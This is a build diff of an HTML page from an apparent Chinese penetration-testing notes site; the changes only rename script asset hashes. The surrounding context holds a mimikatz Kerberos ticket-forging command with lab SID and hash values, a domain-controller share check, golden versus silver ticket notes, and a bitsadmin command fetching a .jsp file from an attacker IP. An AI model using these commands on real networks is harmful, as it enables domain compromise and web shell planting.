@@ -14,10 +14,10 @@
     </script>
     
     <!--loadable-components prefetch  -->
-    <link data-chunk="app" rel="preload" as="script" href="/assets/js/app.e0fbc71b.js">
-<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/vendors~LayoutWrapper.e0fbc71b.js">
-<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/LayoutWrapper.e0fbc71b.js">
-<link data-chunk="knowledge/hw/ntml-hash.md" rel="preload" as="script" href="/assets/js/knowledge/hw/ntml-hash.md.e0fbc71b.js"> 
+    <link data-chunk="app" rel="preload" as="script" href="/assets/js/app.59105602.js">
+<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/vendors~LayoutWrapper.59105602.js">
+<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/LayoutWrapper.59105602.js">
+<link data-chunk="knowledge/hw/ntml-hash.md" rel="preload" as="script" href="/assets/js/knowledge/hw/ntml-hash.md.59105602.js"> 
     <style>pre[class*="language-"].line-numbers {
 	position: relative;
 	padding-left: 3.8em;
@@ -26602,9 +26602,9 @@ meterpreter <span class="token operator">&gt;</span> msv</code></pre></div><p><s
 klist purge</code></pre></div><p><strong>（2）伪造票据</strong></p><div class="rcpress-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">mimikatz.exe <span class="token string">&quot;kerberos::golden /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /target:DC.wintrysec.lab /service:CIFS /rc4:f0e889883425d83b0071e789507b3e6b /user:admin666 /ptt&quot;</span> <span class="token builtin class-name">exit</span></code></pre></div><p><strong>（3）验证权限</strong></p><div class="rcpress-highlight" data-language="text"><pre class="language-text"><code class="language-text">dir \\DC\c$</code></pre></div><h2 class="__internal" id="黄金票据和白银票据的不同">黄金票据和白银票据的不同<a href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E4%B8%8D%E5%90%8C" aria-hidden="true" class="anchor">#</a></h2><p><strong>访问权限不同：</strong></p><ul><li class="__internal">Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</li><li class="__internal">Silver Ticket：伪造TGS，只能访问指定的服务</li></ul><p><strong>加密方式不同：</strong></p><ul><li class="__internal">Golden Ticket由Kerberos的Hash加密</li><li class="__internal">Silver Ticket由服务账号（通常为计算机账户）Hash加密</li></ul><p><strong>认证流程不同：</strong></p><ul><li class="__internal">Golden Ticket的利用过程需要访问域控，</li><li class="__internal">而Silver Ticket不需要</li></ul><h1 class="__internal" id="windows文件下载">Windows文件下载<a href="#windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD" aria-hidden="true" class="anchor">#</a></h1><div class="rcpress-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">bitsadmin /transfer n http://192.168.9.202/wintrysec.jsp C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>新建文件夹<span class="token punctuation">\</span>wintrysec.jsp</code></pre></div></section><section class="prev-next-nav"></section></article></div></div></div></div></div></div></div>
      <!--loadable-components render area  -->
     <script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json">[56,0,31]</script>
-<script async data-chunk="app" src="/assets/js/app.e0fbc71b.js"></script>
-<script async data-chunk="LayoutWrapper" src="/assets/js/vendors~LayoutWrapper.e0fbc71b.js"></script>
-<script async data-chunk="LayoutWrapper" src="/assets/js/LayoutWrapper.e0fbc71b.js"></script>
-<script async data-chunk="knowledge/hw/ntml-hash.md" src="/assets/js/knowledge/hw/ntml-hash.md.e0fbc71b.js"></script>
+<script async data-chunk="app" src="/assets/js/app.59105602.js"></script>
+<script async data-chunk="LayoutWrapper" src="/assets/js/vendors~LayoutWrapper.59105602.js"></script>
+<script async data-chunk="LayoutWrapper" src="/assets/js/LayoutWrapper.59105602.js"></script>
+<script async data-chunk="knowledge/hw/ntml-hash.md" src="/assets/js/knowledge/hw/ntml-hash.md.59105602.js"></script>
   </body>
 </html>
